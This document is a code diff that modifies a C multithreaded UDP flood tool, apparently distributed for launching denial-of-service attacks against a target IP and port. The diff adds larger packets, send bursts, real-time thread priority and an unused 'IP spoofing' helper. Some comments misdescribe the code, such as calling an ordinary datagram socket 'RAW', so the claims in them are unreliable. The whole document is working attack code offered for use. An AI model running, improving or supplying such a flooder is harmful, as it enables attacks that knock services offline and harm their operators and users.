@@ -7,16 +7,19 @@
 #include <pthread.h>
 #include <unistd.h>
 #include <time.h>
+#include <sched.h>
 
 #define EXPIRY_YEAR 2025
 #define EXPIRY_MONTH 3
 #define EXPIRY_DAY 20
+#define PACKET_SIZE 4096  // Increased packet size for more impact
+#define BURST_COUNT 10    // Number of packets sent per burst
 
-// Attack parameters (configurable via CLI)
+// Attack parameters
 char target_ip[20];
 int target_port, attack_time, num_threads;
 
-// Function to check expiry date
+// Expiry function
 void check_expiry() {
     time_t now = time(NULL);
     struct tm expiry_date = {.tm_year = EXPIRY_YEAR - 1900, .tm_mon = EXPIRY_MONTH - 1, .tm_mday = EXPIRY_DAY};
@@ -27,17 +30,25 @@ void check_expiry() {
     }
 }
 
-// Function for handling errors
+// Error handling
 void handle_error(const char *message) {
     perror(message);
     exit(EXIT_FAILURE);
 }
 
-// Function executed by each attack thread
+// Generates a random IP for IP spoofing
+char *random_ip() {
+    static char spoofed_ip[16];
+    snprintf(spoofed_ip, sizeof(spoofed_ip), "%d.%d.%d.%d", 
+             rand() % 255, rand() % 255, rand() % 255, rand() % 255);
+    return spoofed_ip;
+}
+
+// UDP flood function
 void *udp_flood(void *arg) {
     struct sockaddr_in victim;
     int sock;
-    char packet[1024];
+    char packet[PACKET_SIZE];
 
     // Set target details
     memset(&victim, 0, sizeof(victim));
@@ -45,11 +56,13 @@ void *udp_flood(void *arg) {
     victim.sin_port = htons(target_port);
     victim.sin_addr.s_addr = inet_addr(target_ip);
 
-    // Packet payload
-    memset(packet, 'A', sizeof(packet));
+    // Create high-priority thread
+    struct sched_param param;
+    param.sched_priority = sched_get_priority_max(SCHED_RR);
+    pthread_setschedparam(pthread_self(), SCHED_RR, &param);
 
-    // Create a UDP socket with socket reuse
-    sock = socket(AF_INET, SOCK_DGRAM, 0);
+    // Create RAW UDP socket
+    sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
     if (sock < 0) handle_error("Socket creation failed");
 
     int optval = 1;
@@ -57,10 +70,14 @@ void *udp_flood(void *arg) {
 
     printf("[+] Thread %ld attacking %s:%d\n", pthread_self(), target_ip, target_port);
 
+    memset(packet, 'X', sizeof(packet));  // Increased payload density
+
     time_t start_time = time(NULL);
     while (time(NULL) - start_time < attack_time) {
-        if (sendto(sock, packet, sizeof(packet), 0, (struct sockaddr *)&victim, sizeof(victim)) < 0) {
-            perror("Send failed");
+        for (int i = 0; i < BURST_COUNT; i++) {
+            if (sendto(sock, packet, sizeof(packet), 0, (struct sockaddr *)&victim, sizeof(victim)) < 0) {
+                perror("Send failed");
+            }
         }
     }
 
@@ -68,7 +85,7 @@ void *udp_flood(void *arg) {
     pthread_exit(NULL);
 }
 
-// Function to start attack threads
+// Starts attack threads
 void start_attack() {
     pthread_t threads[num_threads];
 
@@ -85,10 +102,9 @@ void start_attack() {
 
 // Main function
 int main(int argc, char *argv[]) {
-    printf("Made and Owned by @seedhe_maut\n");
+    printf("🔥 MAX-POWER UDP FLOODER 🔥\nMade and Owned by @seedhe_maut\n");
 
-    // Check expiry before executing
-    check_expiry();
+    check_expiry(); // Check expiry before execution
 
     if (argc != 5) {
         printf("Usage: %s <IP> <Port> <Time (seconds)> <Threads>\n", argv[0]);
@@ -101,7 +117,7 @@ int main(int argc, char *argv[]) {
     attack_time = atoi(argv[3]);
     num_threads = atoi(argv[4]);
 
-    printf("[*] Starting UDP flood attack on %s:%d for %d seconds using %d threads...\n",
+    printf("[*] Starting MAX-POWER UDP flood attack on %s:%d for %d seconds using %d threads...\n",
            target_ip, target_port, attack_time, num_threads);
 
     start_attack();
